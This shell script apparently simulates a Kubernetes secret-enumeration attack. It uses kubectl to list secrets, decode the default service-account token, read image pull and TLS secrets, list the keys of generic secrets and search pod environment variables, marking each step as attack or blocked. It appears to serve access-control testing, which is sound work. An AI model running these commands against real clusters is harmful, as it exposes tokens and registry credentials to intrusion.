#!/bin/sh
set -eu

# Attempts to enumerate and access Kubernetes secrets
# This simulates an attacker trying to discover sensitive information

namespace="${1:-frontend}"

echo "[ATTACK] Secret Enumeration Attack"
echo "[INFO] Target namespace: $namespace"

# Step 1: List all secrets in namespace
echo "[ATTACK] Enumerating secrets in namespace: $namespace"
kubectl get secrets -n "$namespace" -o wide 2>/dev/null || echo "[BLOCKED] Cannot list secrets"

# Step 2: Try to access specific secret types
echo "[ATTACK] Attempting to access default service account token..."
kubectl get secret -n "$namespace" default-token -o jsonpath='{.data.token}' 2>/dev/null | base64 -d 2>/dev/null | head -c 50 && echo "..." || echo "[BLOCKED] Cannot access default token"

# Step 3: Try to access image pull secrets
echo "[ATTACK] Attempting to enumerate image pull secrets..."
kubectl get secrets -n "$namespace" --field-selector type=kubernetes.io/dockerconfigjson -o name 2>/dev/null | while read secret; do
    echo "[INFO] Found image pull secret: $secret"
    kubectl get "$secret" -n "$namespace" -o jsonpath='{.data.\.dockerconfigjson}' 2>/dev/null | base64 -d 2>/dev/null | head -c 100 && echo "..." || true
done

# Step 4: Try to access TLS secrets
echo "[ATTACK] Attempting to enumerate TLS secrets..."
kubectl get secrets -n "$namespace" --field-selector type=kubernetes.io/tls -o name 2>/dev/null | while read secret; do
    echo "[INFO] Found TLS secret: $secret"
    kubectl get "$secret" -n "$namespace" -o jsonpath='{.data.tls\.crt}' 2>/dev/null | base64 -d 2>/dev/null | head -c 50 && echo "..." || true
done

# Step 5: Try to access Opaque secrets (generic secrets)
echo "[ATTACK] Attempting to enumerate generic secrets..."
kubectl get secrets -n "$namespace" --field-selector type=Opaque -o name 2>/dev/null | while read secret; do
    echo "[INFO] Found generic secret: $secret"
    # Try to get all keys
    kubectl get "$secret" -n "$namespace" -o jsonpath='{.data}' 2>/dev/null | grep -o '"[^"]*":' | sed 's/"//g' | sed 's/://g' | while read key; do
        echo "  Key: $key"
    done
done

# Step 6: Try to access secrets from within a pod
pod_name=$(kubectl get pods -n "$namespace" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
if [ -n "$pod_name" ]; then
    echo "[ATTACK] Attempting to access secrets from pod: $pod_name"
    kubectl exec -n "$namespace" "$pod_name" -- env | grep -i secret || echo "[BLOCKED] No secret environment variables found"
fi

echo "[COMPLETE] Secret enumeration attack finished"

